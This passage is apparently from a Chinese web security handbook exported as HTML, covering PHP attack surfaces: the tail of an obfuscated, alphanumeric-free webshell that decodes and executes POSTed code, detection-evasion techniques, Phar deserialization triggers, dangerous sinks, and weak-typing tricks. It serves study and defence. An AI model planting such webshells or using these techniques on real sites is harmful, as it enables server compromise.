class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$___</span>.<span class="cm-operator">=</span><span class="cm-def">$__</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$____</span><span class="cm-operator">=</span><span class="cm-string">'_'</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">=</span><span class="cm-def">$_</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">20</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span>,→<span class="cm-operator">++</span>;//P</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">21</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$____</span>.<span class="cm-operator">=</span><span class="cm-def">$__</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">22</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">=</span><span class="cm-def">$_</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">23</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;//O</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">24</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$____</span>.<span class="cm-operator">=</span><span class="cm-def">$__</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">25</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">=</span><span class="cm-def">$_</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">26</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span>,→<span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;//S</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">27</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$____</span>.<span class="cm-operator">=</span><span class="cm-def">$__</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">28</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">=</span><span class="cm-def">$_</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">29</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span>,→<span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;<span class="cm-def">$__</span><span class="cm-operator">++</span>;//T</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">30</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$____</span>.<span class="cm-operator">=</span><span class="cm-def">$__</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">31</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">32</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$_</span><span class="cm-operator">=</span><span class="cm-def">$$____</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">33</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$___</span>(base64_decode(<span class="cm-def">$_</span>[_]));</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 907px;"></div><div class="CodeMirror-gutters" style="height: 907px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><h4 id='检测对抗'><span>检测对抗</span></h4><ul><li><span>基于混淆影响程序分析</span></li><li><span>基于动态变量影响程序执行</span></li><li><span>抛出异常打断数据流分析</span></li><li><span>基于反射打断数据流分析</span></li><li><span>基于引用传递打断数据流分析</span></li></ul><h3 id='代码混淆-1'><span>代码混淆</span></h3><p><span>PHP 代码混淆有多种方案，包括加密文件、混淆、基于虚拟机加密、基于 opcode 加密、基于扩展加密等。</span></p><p><span>加密文件是指直接加密所有 php 文件，通过特定方式解密后通过 eval 等方式执行，这种方式最容易被还原。混淆是移除变量名并通过 AST 一定程度改变代码组织方式以降低代码可读性的方法，这种方式可以通过对应的反向替换来做到部分还原。基于虚拟机的方式自己实现了一个虚拟机，将 PHP 转换为特定的代码，这种方式基本无法还原但是执行效率很低。基于 opcode 加密是 zend guard 等工具使用的方法，将代码编译为 opcode 后再执行。基于扩展的加密需要引入额外的扩展，实现增加垃圾代码、修改控制流、加密明文字符串等操作。</span></p><h3 id='phar-1'><span>Phar</span></h3><h4 id='简介-15'><span>简介</span></h4><p><span>Phar（PHP Archive）文件是一种打包格式，将 PHP 代码文件和其他资源放入一个文件中来实现应用程序和库的分发。</span></p><p><span>在来自 Secarma 的安全研究员 Sam Thomas 在 18 年的 Black Hat 上提出后利用方式后，开始受到广泛的关注。</span></p><p><span>Phar 可利用是因为 Phar 以序列化的形式存储用户自定义的 meta-data，而以流的形式打开的时候，会自动反序列化，从而触发对应的攻击载荷。</span></p><h4 id='phar-文件结构'><span>Phar 文件结构</span></h4><p><span>Phar 由四个部分组成，分别是 stub / manifest / 文件内容 / 签名。stub 需要 HALT_COMPILER(); 这个调用在 PHP 代码中。</span></p><p><span>manifest 包含压缩文件的权限、属性、序列化形式存储的 meta-data 等信息，这是攻击的核心部分，主要就是解析 Phar 时对 meta-data 的反序列化。</span></p><h4 id='原理-2'><span>原理</span></h4><p><span>phar 的实现在 php-src/ext/phar/phar.c 中，主要是 phar_parse_metadata 函数在解析 phar 文件时调用了 php_var_unserialize ，因而造成问题。</span></p><p><span>而 php 在文件流处理过程中会调用</span><span>_</span><span>php_stream_stat_path(/main/streams/streams.c) ，而后间接调用phar_wrapper_stat ，所以大量的文件操作函数都可以触发 phar 的反序列问题。</span></p><p><span>目前已知部分的触发函数有:</span></p><blockquote><p><strong><span>fileatime / filectime / filemtime /stat / fileinode / fileowner / filegroup / fileperms / file / file_get_contents</span></strong></p><p><strong><span>/ readfile / fopen / file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable / parse_ini_file / unlink / copy / exif_thumbnail / exif_imagetype / imageloadfont / image- createfrom</span><span>*</span><span>*</span><span>*</span><span> / hash_hmac_file / hash_file / hash_update_file / md5_file / sha1_file / get_meta_tags</span></strong></p><p><strong><span>/ get_headers / getimagesize / getimagesizefromstring</span></strong></p></blockquote><h3 id='sink-1'><span>Sink</span></h3><h4 id='任意代码执行'><span>任意代码执行</span></h4><ul><li><span>eval</span></li><li><span>assert</span></li><li><span>call_user_func</span></li></ul><h4 id='执行系统命令'><span>执行系统命令</span></h4><ul><li><span>pcntl_exec</span></li><li><span>exec</span></li><li><span>passthru</span></li><li><span>popen</span></li><li><span>shell_exec</span></li><li><span>system</span></li><li><span>proc_open</span></li></ul><h4 id='magic-函数'><span>Magic 函数</span></h4><ul><li><span>__construct() 构建对象的时被调用</span></li><li><span>__destruct() 销毁对象或脚本结束时被调用</span></li><li><span>__call() 调用不可访问或不存在的方法时被调用</span></li><li><span>__callStatic() 调用不可访问或不存在的静态方法时被调用</span></li><li><span>__get() 读取不可访问或不存在属性时被调用</span></li><li><span>__set() 给不可访问或不存在属性赋值时被调用</span></li><li><span>__isset() 对不可访问或不存在的属性调用 isset 或 empty() 时被调用</span></li><li><span>__unset() 对不可访问或不存在的属性进行 unset 时被调用</span></li><li><span>__sleep() 对象序列化时被调用</span></li><li><span>__wakeup() 对象反序列化时被调用，其中序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过 wakeup 的执行</span></li><li><span>__toString() 当一个类被转换成字符串时被调用</span></li><li><span>__invoke() 对象被以函数方式调用时被调用</span></li><li><span>__set_state() 调用 var_export() 导出类时被调用</span></li><li><span>__clone() 进行对象 clone 时被调用</span></li><li><span>__debugInfo() 调用 var_dump() 打印对象时被调用</span></li></ul><h4 id='文件相关敏感函数'><span>文件相关敏感函数</span></h4><ul><li><span>move_uploaded_file</span></li><li><span>file_put_contents / file_get_contents</span></li><li><span>unlink</span></li><li><span>fopen / fgets</span></li></ul><h4 id='ssrf-2'><span>SSRF</span></h4><ul><li><span>file_get_contents()</span></li><li><span>fsockopen()</span></li><li><span>curl_exec()</span></li><li><span>fopen()</span></li><li><span>readfile()</span></li></ul><h4 id='phar-触发点'><span>phar 触发点</span></h4><ul><li><p><span>fileatime / filectime / filemtime</span></p></li><li><p><span>stat / fileinode / fileowner / filegroup / fileperms</span></p></li><li><p><span>file / file_get_contents / readfile / fopen</span>’</p></li><li><p><span>file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable</span></p></li><li><p><span>parse_ini_file</span></p></li><li><p><span>unlink</span></p></li><li><p><span>copy</span></p></li><li><h5 id='exif'><span>exif</span></h5><ul><li><span>exif_thumbnail</span></li><li><span>exif_imagetype</span></li></ul></li><li><h5 id='gd'><span>gd</span></h5><ul><li><span>imageloadfont</span></li><li><span>imagecreatefrom***</span></li></ul></li><li><h4 id='hash-1'><span>hash</span></h4><ul><li><span>hash_hmac_file</span></li><li><span>hash_file</span></li><li><span>hash_update_file</span></li><li><span>md5_file</span></li><li><span>sha1_file</span></li></ul></li><li><h4 id='file--url'><span>file / url</span></h4><ul><li><span>get_meta_tags</span></li><li><span>get_headers</span></li></ul></li><li><h4 id='standard'><span>standard</span></h4><ul><li><span>getimagesize</span></li></ul></li><li><p><span>getimagesizefromstring</span></p></li></ul><h4 id='原生类利用'><span>原生类利用</span></h4><ul><li><p><strong><span>XSS</span></strong></p><ul><li><span>Error</span></li><li><span>Exception</span></li></ul></li><li><p><strong><span>SSRF</span></strong></p><ul><li><span>SoapClient</span></li></ul></li><li><h4 id='openbasedir-绕过'><span>open_basedir 绕过</span></h4><ul><li><span>DirectoryIterator 结合 glob://</span></li></ul></li><li><h4 id='xxe-1'><span>XXE</span></h4><ul><li><span>SimpleXMLElement</span></li></ul></li></ul><h3 id='其它'><span>其它</span></h3><h4 id='低精度'><span>低精度</span></h4><p><span>php 中并不是用高精度来存储浮点数，而是用使用 IEEE 754 双精度格式，造成在涉及到浮点数比较的时候可能会出现预期之外的错误。比如 php -r </span><span>&quot;</span><span>var_dump(0.2+0.7==0.9);</span><span>&quot;</span><span> 这行代码的输出是 bool(false)而不是 bool(true)。这在一些情况下可能出现问题。</span></p><h4 id='弱类型'><span>弱类型</span></h4><p><span>如果使用 == 来判断相等，则会因为类型推断出现一些预料之外的行为，比如 magic hash，指当两个 md5 值都是 0e</span><span>[</span><span>0-9</span><span>]</span><span>{30} 的时候，就会认为两个 hash 值相等。另外在判断字符串和数字的时候，PHP 会自动做类型转换，那么 1==</span><span>&quot;</span><span>1a.php</span><span>&quot;</span><span> 的结果会是 true</span></p><p><span>另外在判断一些 hash 时，如果传入的是数组，返回值会为 NULL, 因此在判断来自网络请求的数据的哈希值时需要先判断数据类型。</span></p><p><span>同样的，strcmp() ereg() strpos() 这些函数在处理数组的时候也会异常，返回 NULL。</span></p><h4 id='命令执行-1'><span>命令执行</span></h4><p><span>preg_replace 第一个参数是//e 的时候，第二个参数会被当作命令执行</span></p><h4 id='截断'><span>截断</span></h4><p><span>PHP 字符存在截断行为，可以使用 ereg / %00 / iconv 等实现 php 字符截断的操作，从而触发漏洞。</span></p><h4 id='变量覆盖'><span>变量覆盖</span></h4><p><span>当使用 extract / parse_str 等函数时，或者使用 php 的 </span><span>$</span><span>$</span><span> 特性时，如果没有正确的调用，则可能使得用户可以任意修改变量。</span></p><h4 id='php-特性'><span>php 特性</span></h4><ul><li><span>php 自身在解析请求的时候，如果参数名字中包含</span>”<span> </span>“<span>、</span>”<span>.</span>“<span>、</span>”<span>[</span>“<span> 这几个字符，会将他们转换成下划线</span></li><li><span>由于历史原因，urlencode 和 RFC3896 存在一定的不同，PHP 另外提供了 rawurlencode 对 RFC3896完成标准的实现</span></li></ul><h4 id='tmp-临时文件竞争'><span>/tmp 临时文件竞争</span></h4><p><span>phpinfo 可访问时，可以看到上传的临时文件的路径，从而实现 LFI。</span></p><h3 id='版本安全改动'><span>版本安全改动</span></h3><h4 id='80'><span>8.0</span></h4><ul><li><span>字符串与数字弱类型比较将首先将数字转为字符串，然后比较两个字符串</span></li><li><span>内部参数内省错误时抛出异常而不是警告</span></li><li><span>assert 不再支持执行代码</span></li><li><span>移除 create_function</span></li><li><span>移除 mb_ereg_replace() 中的 e 模式</span></li><li><span>Phar 中的元信息不再自动进行反序列化</span></li><li><span>parse_str 必须传入第二个参数</span></li><li><span>移除 php://filter 中的 string.strip_tags</span></li></ul><h4 id='72'><span>7.2</span></h4><ul><li><span>不带引号的字符串会产生 E_WARNING</span></li><li><span>create_function 被废弃</span></li><li><span>assert 不能传入字符串表达式</span></li><li><span>不带第二个参数的情况下使用 parse_str() 会产生 E_DEPRECATED 警告</span></li><li><span>__autoload() 被废弃</span></li></ul><h4 id='71'><span>7.1</span></h4><ul><li><span>调用用户定义的函数提供的参数不足会抛出错误异常而不是警告</span></li><li><span>在不完整的对象上不再调用析构方法</span></li><li><span>call_user_func() 不再支持对传址的函数的调用</span></li><li><span>mb_ereg_replace() 和 mb_eregi_replace() 的 e 模式修饰符被废弃</span></li><li><span>ext/mcrypt 被废弃</span></li></ul><h4 id='70'><span>7.0</span></h4><ul><li><span>preg_replace </span>“<span>e</span>”<span> 修饰符产生 E_WARNING 错误且失效</span></li><li><span>移除所有 ext/mysql 函数</span></li><li><span>移除所有 ext/mssql 函数</span></li><li><span>移除 call_user_method() 和 call_user_method_array()</span></li><li><span>foreach 不再改变内部数组指针</span></li><li><span>在之前，一个八进制字符如果含有无效数字，该无效数字将被静默删节 ( 0128 将被解析为 012)，现在这样的八进制字符将产生解析错误</span></li><li><span>十六进制字符串不再被认为是数字</span></li><li><span>dl() 在 PHP-FPM 不再可用，在 CLI 和 embed SAPIs 中仍可用</span></li><li><span>移除 ASP 和 script PHP 标签，即 </span><span>&lt;</span><span>% %</span><span>&gt;</span><span> / </span><span>&lt;</span><span>%= %</span><span>&gt;</span><span> / </span><span>&lt;</span><span>script language=</span><span>&quot;</span><span>php</span><span>&quot;</span><span>&gt;</span><span> </span><span>&lt;</span><span>/script</span><span>&gt;</span></li><li><span>在数值溢出的时候，内部函数将会失败</span></li><li><span>$</span><span>HTTP_RAW_POST_DATA 被移除</span></li></ul><h4 id='56'><span>5.6</span></h4><ul><li><span>$</span><span>HTTP_RAW_POST_DATA 被废弃</span></li><li><span>必须先设置 CURLOPT_SAFE_UPLOAD 为 FALSE 才能够使用 \@file 语法来上传文件</span></li></ul><h4 id='55'><span>5.5</span></h4><ul><li><span>preg_replace </span>“<span>e</span>”<span> 修饰符产生 E_DEPRECATED 错误</span></li><li><span>废弃 mysql</span><span>_</span><span>*</span><span> 系列函数</span></li></ul><h4 id='54'><span>5.4</span></h4><ul><li><span>不再支持安全模式</span></li><li><span>移除魔术引号</span></li><li><span>数组转换成字符串将产生一条 E_NOTICE 级别的错误</span></li></ul><h3 id='tricks-3'><span>Tricks</span></h3><ul><li><span>is_numeric 前后有空格时，不会判断为 true</span></li><li><span>松散比较时，两个 0e 开头的不同哈希会判断为相等</span></li><li><span>松散比较时，非数字的字符串序列和数字比较会自动转换</span></li><li><span>strcmp/ereg 等函数在传入参数类型为数组时会有非预期行为</span></li></ul><h3 id='参考链接-4'><span>参考链接</span></h3><h4 id='bypass-6'><span>Bypass</span></h4><ul><li><a href='https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/'><span>php open basedir bypass</span></a></li><li><a href='https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/'><span>open basedir bypass</span></a></li><li><a href='https://github.com/l3m0n/Bypass_Disable_functions_Shell'><span>Bypass Disable functions Shell</span></a></li></ul><h4 id='tricks-4'><span>Tricks</span></h4><ul><li><a href='https://www.ptsecurity.com/upload/corporate/ru-ru/webinars/ics/%D0%90.%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B8%D0%BD_%D0%9E_%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF_%D0%B8%D1%81%D0%BF_%D0%A0%D0%9D%D0%A0_wrappers.pdf'><span>php wrappers</span></a></li><li><a href='http://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html'><span>反序列化之 PHP 原生类的利用</span></a></li><li><a href='https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html'><span>php 解密的数种方法</span></a></li><li><a href='https://gynvael.coldwind.pl/?id=671'><span>Surprising CTF task solution using php://filter</span></a></li><li><a href='https://mp.weixin.qq.com/s/ol70aVdvybzMJmtfxaAAZQ'><span>主机安全洋葱 Webshell 检测实践与思考</span></a></li></ul><h4 id='webshell-2'><span>WebShell</span></h4><ul><li><a href='https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet'><span>PHP htaccess inject</span></a></li><li><a href='https://blog.manchestergreyhats.co.uk/2018/11/07/php-malware-examination/'><span>php 木马加密</span></a></li><li><a href='https://www.freebuf.com/articles/web/155891.html'><span>PHP WebShell 变形技术总结</span></a></li><li><a href='https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html'><span>一些不包含数字和字母的 webshell</span></a></li><li><a href='https://mp.weixin.qq.com/s/FgzIm-IK02rjEf3JvxOxrw'><span>PHP Webshell 那些事-攻击篇</span></a></li></ul><h4 id='phar-2'><span>Phar</span></h4><ul><li><a href='https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf'><span>US Black Hat 2018 Phar</span></a></li><li><a href='https://paper.seebug.org/680/'><span>利用 phar 拓展 php 反序列化漏洞攻击面</span></a></li><li><a href='https://blog.zsxsoft.com/post/38'><span>Phar 与 Stream Wrapper 造成 PHP RCE 的深入挖掘</span></a></li></ul><h4 id='运行'><span>运行</span></h4><ul><li><a href='http://www.phpinternalsbook.com/php7/extensions_design/php_lifecycle.html'><span>Learning the PHP lifecycle</span></a></li><li><a href='https://github.com/pangudashu/php7-internal'><span>PHP7 内核剖析</span></a></li></ul><h4 id='blog-2'><span>Blog</span></h4><ul><li><a href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/'><span>How we broke PHP</span></a></li></ul><h2 id='52-python'><span>5.2 Python</span></h2><h3 id='格式化字符串-1'><span>格式化字符串</span></h3><blockquote><p><span>在 Python 中，有两种格式化字符串的方式，在 Python2 的较低版本中，格式化字符串的方式为 </span><span>&quot;</span><span>this is a %s</span><span>&quot;</span><span> % </span><span>&quot;</span><span>test</span><span>&quot;</span><span> ，之后增加了 format 的方式，语法为 </span><span>&quot;</span><span>this is a {}</span><span>&quot;</span><span>.format(</span><span>&#39;</span><span>test</span><span>&#39;</span><span>) 或者 </span><span>&quot;</span><span>this is a {test}</span><span>&quot;</span><span>.format(test=</span><span>&#39;</span><span>test</span><span>&#39;</span><span>)</span></p><p><span>当格式化字符串由用户输入时，则可能会造成一些问题，下面是一个最简单的例子</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>2</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span><span class="cm-string">'class of {0} is {0.__class__}'</span><span class="cm-punctuation">.</span><span class="cm-identifier">format</span><span class="cm-punctuation">(</span><span class="cm-number">42</span><span class="cm-punctuation">)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">"class of 42 is &lt;class'int'&gt;"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>从上面这个简单的例子不难知道， 当我们可以控制要 format 的字符串时， 则可以使用 </span><span>_</span><span>_</span><span>init</span><span>_</span><span>_</span><span> /_</span><span>_</span><span>globals__ 等属性读取一些比较敏感的值，甚至任意执行代码。</span></p></blockquote><h3 id='反序列化-2'><span>反序列化</span></h3><h4 id='pickle-demo'><span>pickle demo</span></h4><p><span>Python Pickle 在反序列化时会调用 </span><span>_</span><span>_</span><span>reduce__ ，可用自定义的 _</span><span>_</span><span>reduce__ 函数来实现攻击。</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="python"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>12</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " 